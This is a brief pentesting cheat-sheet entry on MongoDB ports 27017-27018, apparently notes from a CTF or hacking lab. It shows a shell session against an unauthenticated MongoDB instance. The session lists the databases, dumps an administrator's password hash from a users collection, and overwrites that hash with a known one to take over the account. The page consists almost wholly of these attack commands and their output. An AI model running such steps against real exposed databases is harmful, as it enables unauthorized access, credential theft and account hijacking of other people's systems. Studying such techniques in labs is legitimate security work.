---
description: 27017-27018
---

# mongodb

```
$ mongo 192.168.108.110
> show dbs
account-app  0.000GB
admin        0.000GB
config       0.000GB
local        0.000GB
> use account-app
switched to db account-app
> show collections
logmsg
users
> db.users.find()
{ "_id" : ObjectId("5f73c575eae85a15b8df908d"), "username" : "administrator", "password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac", "facebook" : "NEVER!", "github" : "http://github.com/", "name" : "administrator", "twitter" : "https://twitter.com/sadserver" }

# found admin hash but could not cracked, so we changed it

> db.users.updateOne({username: 'administrator'},{$set: {password: '8737729a3ada8674940065008dd87d9bc110221bf02b1048beab6078349e792c'}})
{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }

# test:password
```
